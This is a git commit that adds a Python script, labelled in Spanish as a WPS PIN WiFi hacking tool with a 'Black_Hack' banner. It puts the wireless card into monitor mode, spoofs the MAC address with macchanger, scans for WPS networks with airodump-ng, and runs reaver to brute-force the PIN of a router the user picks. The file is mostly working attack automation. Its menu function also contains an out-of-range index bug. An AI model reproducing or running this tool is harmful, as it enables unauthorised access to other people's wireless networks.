17fa49ca28cd966aa81036b2fb68ee1cdd862cad
David <sotodelanoche@gmail.com>
2020-07-27 20:38:03 +0000

    Update Raver.py

--- Raver.py
+++ Raver.py
@@ -1,1 +1,70 @@
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ LIBRERIAS $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+import os, time, threading, io
 
+## Crador Smp_A
+# Fecha 25.7.2020
+# Licencia Open soft GNU
+# Nombre programa Rave WiFi telefono
+# Tipo Script shell
+# Hack pin wps Wifi basado en Raver
+# lenguaje Python3 
+#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ PRESENTACION TERMINAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+os.system('clear')
+print("\033[1;31;1m ")
+os.system('figlet        Smp_A')
+print("			  	   Black_Hack")                 	
+print("\033[1;37;1m ")
+#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+listamenu=["opciones:", "1) Scaner red ", "2) Reaver_wifi","3) Exit"]#Menu Princcipal
+key=0
+exit=False
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+def menu():
+	print("     "+listamenu[0])
+	print(listamenu[1])
+	print(listamenu[2])
+	print(listamenu[3])
+	print(listamenu[4])
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+def scan():
+	global wlan
+	os.system("ifconfig")
+	wlan=input("Introduzca Wlan: ")
+	print("Procesando")
+	os.system('ip link set '+wlan+' up')
+	os.system('airmon-ng check kill')
+	os.system('macchanger -A '+wlan) 
+	os.system('airmon-ng start '+wlan)
+	os.system('airodump-ng -i '+wlan+' --wps --manufacturer')
+	return wlan
+
+def attack(wlan):
+	mac=input("seleccione mac : ")
+	chanel=input("seleccione chanel : ")
+	os.system('reaver -i '+wlan+' -b '+mac+' -S -c '+chanel+' -vv')
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+while exit==False:
+	menu()
+	key=(int(input()))
+	if (key==1):
+		scan()
+	elif (key==2):
+		attack(wlan)
+	elif (key==3):
+		os.system('airmon-ng stop wlan0mon')
+		os.system('ifconfig wlan0 down')
+		os.system('iwconfig wlan0 mode managed')
+		os.system('ifconfig wlan0 up')
+		os.system('service network-manager start')
+		exit=True
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
